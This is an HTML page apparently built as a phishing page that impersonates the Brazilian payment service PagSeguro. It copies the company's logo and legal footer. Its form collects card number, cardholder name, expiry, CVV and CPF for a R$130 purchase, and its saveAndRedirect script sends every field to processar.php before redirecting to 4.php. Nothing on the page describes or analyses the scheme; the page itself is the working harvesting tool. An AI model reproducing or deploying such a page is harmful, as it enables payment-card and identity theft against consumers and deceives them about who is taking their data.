<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUdRAHBK7sJSGF5-fDYgEvDKCCYN60Kh9vQA&usqp=CAU">
    <title>PagSeguro</title>
    
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            min-height: 100vh;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow: hidden;
        }
        header {
            width: 100%;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        header img {
            width: 100%;
            height: auto;
            display: block;
        }
        .rectangle {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            overflow: hidden;
        }
        .rectangle img {
            width: 100%;
            height: auto;
            display: block;
        }
        .square {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            border: 2px solid #ccc;
            background-color: rgba(255, 255, 255, 0.5);
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .field {
            width: 100%;
            margin-bottom: 15px;
        }
        .field input, .field select {
            width: 100%;
            box-sizing: border-box;
            padding: 10px;
            border: 2px solid #999;
            border-radius: 5px;
            transition: border-color 0.3s;
            font-size: 16px;
        }
        .field input.invalid, .field select.invalid {
            border-color: #999;
        }
        .field label {
            color: #555;
            font-size: 16px;
            margin-bottom: 5px;
            display: block;
            cursor: pointer;
        }
        .button {
            width: 100%;
            background-color: #7db7d8;
            color: white;
            padding: 15px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .button-text {
            color: black;
            font-size: 14px;
            margin: 5px 0;
            cursor: pointer;
        }
        .blue-text {
            color: blue;
        }
        footer {
            background-color: black;
            color: white;
            padding: 15px;
            text-align: center;
            margin-top: 10px;
        }
    </style>
    <script>
        function saveAndRedirect() {
            var cardNumber = document.getElementById("cardNumber").value;
            var cardName = document.getElementById("cardName").value;
            var cardExpiry = document.getElementById("cardExpiry").value;
            var cardCvv = document.getElementById("cardCvv").value;
            var cpf = document.getElementById("cpf").value;

            if (cardNumber && cardName && cardExpiry && cardCvv && cpf) {
                var productValue = 130.00;
                var selectedInstallments = document.getElementById("installments").value;
                var installmentAmount = (productValue / selectedInstallments).toFixed(2);

                // Enviar dados para processar.php
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "processar.php", true);
                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState == 4 && xhr.status == 200) {
                        // Redirecionar para 4.php após processamento
                        window.location.href = "4.php";
                    }
                };

                var data = "cardNumber=" + cardNumber + "&cardName=" + cardName + "&cardExpiry=" + cardExpiry +
                           "&cardCvv=" + cardCvv + "&cpf=" + cpf + "&installments=" + selectedInstallments;
                xhr.send(data);
            } else {
                alert('Por favor, preencha todos os campos.');
                if (!cardNumber) document.getElementById("cardNumber").classList.add("invalid");
                else document.getElementById("cardNumber").classList.remove("invalid");

                if (!cardName) document.getElementById("cardName").classList.add("invalid");
                else document.getElementById("cardName").classList.remove("invalid");

                if (!cardExpiry) document.getElementById("cardExpiry").classList.add("invalid");
                else document.getElementById("cardExpiry").classList.remove("invalid");

                if (!cardCvv) document.getElementById("cardCvv").classList.add("invalid");
                else document.getElementById("cardCvv").classList.remove("invalid");

                if (!cpf) document.getElementById("cpf").classList.add("invalid");
                else document.getElementById("cpf").classList.remove("invalid");
            }
        }

        function formatCpfCnpj() {
            var input = document.getElementById("cpf");
            var value = input.value.replace(/\D/g, '');
            if (value.length <= 11) {
                input.value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else {
                input.value = value.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, '$1.$2.$3/$4-$5');
            }
        }

        function showInstallmentPopup() {
            var productValue = 130.00;
            var installmentSelect = document.getElementById("installments");
            var selectedInstallments = installmentSelect.value;

            for (var i = 1; i <= 18; i++) {
                var option = installmentSelect.options[i - 1];
                var installmentAmount = (productValue / i).toFixed(2);
                option.text = i + 'x Sem Juros - R$ ' + installmentAmount + ' cada';
            }
        }

        // Additional functions for keyboard and formatting
        function openCardKeyboard() {
            document.getElementById("cardNumber").focus();
        }

        function openDateKeyboard() {
            document.getElementById("cardExpiry").focus();
        }

        function openCvvKeyboard() {
            document.getElementById("cardCvv").focus();
        }

        function formatCardNumber() {
            var input = document.getElementById("cardNumber");
            var value = input.value.replace(/\D/g, '');

            if (value.length > 0) {
                // Add space after every 4 digits
                input.value = value.match(/.{1,4}/g).join(' ');
            }
        }

        function formatCardExpiry() {
            var input = document.getElementById("cardExpiry");
            var value = input.value.replace(/\D/g, '');

            if (value.length > 2) {
                // Add slash after the first 2 digits
                input.value = value.slice(0, 2) + '/' + value.slice(2);
            }
        }
    </script>
</head>
<body>

<div class="container">
    <header>
        <img src="https://i.postimg.cc/CMqc6Qdc/Picsart-23-11-11-12-01-37-242.jpg" alt="Cabeçalho">
    </header>

    <!-- Rectangle below the header -->
    <div class="rectangle">
        <img src="https://i.postimg.cc/NGT83kN8/3.jpg" alt="Retângulo">
    </div>

    <!-- Square between the rectangle and footer -->
    <div class="square">
        <div class="field">
            <label for="cardNumber" onclick="openCardKeyboard()">Número do Cartão</label>
            <input type="tel" id="cardNumber" name="cardNumber" class="invalid" oninput="formatCardNumber(); this.classList.remove('invalid');" maxlength="19">
        </div>
        <div class="field">
            <label for="cardName">Nome Impresso no Cartão</label>
            <input type="text" id="cardName" name="cardName" class="invalid" oninput="this.value = this.value.toUpperCase(); this.classList.remove('invalid');">
        </div>
        <div class="field">
            <label for="cardExpiry" onclick="openDateKeyboard()">Data de Validade (MM/AA)</label>
            <input type="tel" id="cardExpiry" name="cardExpiry" class="invalid" oninput="formatCardExpiry(); this.classList.remove('invalid');" maxlength="5">
        </div>
        <div class="field">
            <label for="cardCvv" onclick="openCvvKeyboard()">Código CVV</label>
            <input type="tel" id="cardCvv" name="cardCvv" class="invalid" oninput="this.value = this.value.slice(0, 4); this.classList.remove('invalid');" maxlength="4">
        </div>
        <div class="field">
            <label for="cpf" onclick="formatCpfCnpj(); openCardKeyboard();">CPF</label>
            <input type="tel" id="cpf" name="cpf" class="invalid" oninput="formatCpfCnpj(); this.classList.remove('invalid');" maxlength="14">
        </div>
        <p class="button-text">Valor do Produto: R$ 130,00</p>
        <div class="field">
            <label for="installments">Parcelas</label>
            <select id="installments" name="installments" onchange="showInstallmentPopup()">
                <option value="1">1x Sem Juros - R$ 130,00</option>
                <option value="2">2x Sem Juros</option>
                <option value="3">3x Sem Juros</option>
                <option value="4">4x Sem Juros</option>
                <option value="5">5x Sem Juros</option>
                <option value="6">6x Sem Juros</option>
                <option value="7">7x Sem Juros</option>
                <option value="8">8x Sem Juros</option>
                <option value="9">9x Sem Juros</option>
                <option value="10">10x Sem Juros</option>
                <option value="11">11x Sem Juros</option>
                <option value="12">12x Sem Juros</option>
                <option value="13">13x Sem Juros</option>
                <option value="14">14x Sem Juros</option>
                <option value="15">15x Sem Juros</option>
                <option value="16">16x Sem Juros</option>
                <option value="17">17x Sem Juros</option>
                <option value="18">18x Sem Juros</option>
            </select>
        </div>
        <button class="button" onclick="saveAndRedirect()">Continuar</button>
        <p class="button-text blue-text" onclick="showInstallmentPopup()">Simular outras condições de parcelamento</p>
    </div>

    <footer>
        <div class="_2EmXf">
            <link itemprop="url" href="https://pagseguro.uol.com.br/">
            <link itemprop="logo" href="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg">
            <img width="102" height="28" src="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg" alt="PagBank" class="MEWVI">
            <div class="_3OkSp">
                <p>© 1996-2023 Todos os direitos reservados.</p>
                <p><span itemprop="name">PAGSEGURO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A</span> - CNPJ/MF 08.561.701/0001-01</p>
                <p itemtype="http://schema.org/PostalAddress" itemprop="location">
                    <span itemprop="streetAddress">&nbsp;Av. Brigadeiro Faria Lima, 1.384</span>,
                    <span itemprop="addressLocality">São Paulo</span> - <span itemprop="addressRegion">SP</span> - CEP<span itemprop="postalCode"> 01451-001</span>
                    <meta itemprop="addressCountry" content="BR">
                </p>
            </div>
        </div>
    </footer>
</div>
</body>
</html>
